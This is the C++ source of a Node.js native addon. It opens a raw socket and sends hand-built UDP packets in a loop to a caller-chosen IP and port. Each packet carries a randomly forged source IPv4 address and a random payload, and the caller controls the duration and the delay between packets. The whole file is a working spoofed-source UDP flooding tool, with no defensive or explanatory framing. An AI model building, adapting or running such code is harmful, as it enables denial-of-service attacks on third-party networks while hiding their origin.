#include <node.h>
#include <nan.h>

#include <iostream>
#include <cstring>
#include <climits>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <unistd.h>
#include <chrono>
#include <thread>

#define sleep_ms(milsec) usleep(milsec * 1000)

using namespace v8;

int sockfd; // raw socket

char dst_ip[20] = {0};
int dst_port;

struct Ip
{
    u_char ver_ihl;    // Version and IP Header Length (IHL)
    u_char tos;        // Type of Service
    u_short total_len; // Total length of the IP datagram
    u_short id;        // Identification
    u_short frag_off;  // Fragment Offset
    u_char ttl;        // Time to Live
    u_char protocol;   // Protocol
    u_short checksum;  // IP Header Checksum
    u_int32_t saddr;   // Source IP Address
    u_int32_t daddr;   // Destination IP Address
};

struct Udp
{
    u_short sport;    // Source Port Number
    u_short dport;    // Destination Port Number
    u_short len;      // Length of the entire UDP packet
    u_short checksum; // UDP Checksum
};

struct Pseudo
{
    u_int32_t saddr; // Source IP Address
    u_int32_t daddr; // Destination IP Address
    u_char zero;     // Zero
    u_char protocol; // Protocol
    u_short length;  // Length of the UDP segment
};

/* Generate random ipv4 address*/
char *generate_ipv4()
{

    uint32_t ipv4_addr = 0;
    char *ipv4_str = (char *)malloc(INET_ADDRSTRLEN);

    for (int i = 0; i < 4; i++)
    {
        ipv4_addr |= (rand() % 256) << (i * 8);
    }

    inet_ntop(AF_INET, &ipv4_addr, ipv4_str, INET_ADDRSTRLEN);
    return ipv4_str;
}

/* Generate random hex array*/
void generate_hex_array(int length, unsigned char *array) {
    for (int i = 0; i < length; i++) {
        array[i] = rand() % 256;
    }
}

/* CRC16 checksum calculator */
unsigned short checksum(unsigned short *ptr, int nbytes)
{
    unsigned long sum;
    unsigned short oddbyte;
    unsigned short answer;

    sum = 0;
    while (nbytes > 1)
    {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1)
    {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;

    return answer;
}

/* Fill in IP header, UDP header
 * Calculate Pseudo UDP header checksum
 */
void init_header(struct Ip *ip, struct Udp *udp, struct Pseudo *pseudo)
{
    // IP header
    ip->ver_ihl = (4 << 4) | (sizeof(Ip) / sizeof(unsigned int));
    ip->tos = 0;
    ip->total_len = htons(sizeof(Ip) + sizeof(struct Udp));
    ip->id = htons(54321);
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_UDP;
    ip->checksum = 0;
    ip->saddr = 0;
    ip->daddr = inet_addr(dst_ip);

    // UDP header
    udp->sport = htons(1024);
    udp->dport = htons(dst_port);
    udp->len = htons(sizeof(Udp));
    udp->checksum = 0;

    // Pseudo UDP header
    pseudo->zero = 0;
    pseudo->protocol = IPPROTO_UDP;
    pseudo->length = htons(sizeof(struct Udp));
    pseudo->daddr = inet_addr(dst_ip);
}

void *send_UDP(void *addr_info, int timeout = 60, int delay = 1000, int packetsize = 10)
{
    struct Ip ip;
    struct Udp udp;
    struct Pseudo pseudo;
    struct sockaddr_in *dest_addr = (struct sockaddr_in *)addr_info;

    char buf[100];
    unsigned char data[packetsize]; // UDP Data
    int count = 0; // Packet sent count

    auto start_time = std::chrono::steady_clock::now();
    srand((unsigned)time(NULL));


    init_header(&ip, &udp, &pseudo);

    while (true)
    {
        ip.saddr = inet_addr(generate_ipv4());
        generate_hex_array(packetsize, data);

        // Calculate IP checksum
        memset(buf, 0, sizeof(buf));
        memcpy(buf, &ip, sizeof(struct Ip));
        ip.checksum = checksum((u_short *)buf, sizeof(struct Ip));

        pseudo.saddr = ip.saddr;

        // Calculate UDP checksum
        memset(buf, 0, sizeof(buf));
        memcpy(buf, &pseudo, sizeof(pseudo));
        memcpy(buf + sizeof(pseudo), &udp, sizeof(udp));
        udp.len = htons(sizeof(udp) + sizeof(data));
        udp.checksum = checksum((u_short *)buf, sizeof(pseudo) + sizeof(udp));

        // Build Data packet
        char packet[sizeof(ip) + sizeof(udp) + sizeof(data)];
        memset(packet, 0, sizeof(packet));
        memcpy(packet, &ip, sizeof(ip));
        memcpy(packet + sizeof(ip), &udp, sizeof(udp));
        memcpy(packet + sizeof(ip) + sizeof(udp), (u_short *)data, sizeof(data));

        // Send data packet
        if (sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)dest_addr, sizeof(struct sockaddr)) < 0)
        {
            perror("sendto");
            exit(EXIT_FAILURE);
        }

        printf("\033[F");
        printf("Sent UDP Packet: %d       \n", count++);


        // Timeout Checker
        auto current_time = std::chrono::steady_clock::now();
        auto elapsed_seconds = std::chrono::duration_cast<std::chrono::seconds>(current_time - start_time).count();

        if (elapsed_seconds >= timeout)
        {
            break;
        }

        // sleep for milliseconds
        sleep_ms(delay);
    }

    printf("Stop all process.");
    return 0;
}

void Method(const FunctionCallbackInfo<Value> &args)
{
    Isolate *isolate = args.GetIsolate();

    // Initialize Socket
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));

    int on = 1; // Custom UDP pakcet
    int timeout = args[2]->Int32Value(isolate->GetCurrentContext()).ToChecked();
    int delay = args[3]->Int32Value(isolate->GetCurrentContext()).ToChecked();
    int packetsize = args[4]->Int32Value(isolate->GetCurrentContext()).ToChecked();

    // Get the destination IP address and port number from the arguments
    String::Utf8Value str_ip(isolate, args[0]);
    String::Utf8Value str_port(isolate, args[1]);
    const char *ip = *str_ip;
    const char *port = *str_port;

    strncpy(dst_ip, ip, 16);
    dst_port = atoi(port);

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(dst_ip);
    addr.sin_port = htons(dst_port);

    // Create raw socket
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0)
    {
        perror("socket()");
        exit(1);
    }

    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) < 0)
    {
        perror("setsockopt()");
        exit(1);
    }

    printf("start send\n");
    send_UDP(&addr, timeout, delay, packetsize);
    close(sockfd);
}

void Initialize(Local<Object> exports)
{
    NODE_SET_METHOD(exports, "sendPacket", Method);
}

NODE_MODULE(addon, Initialize)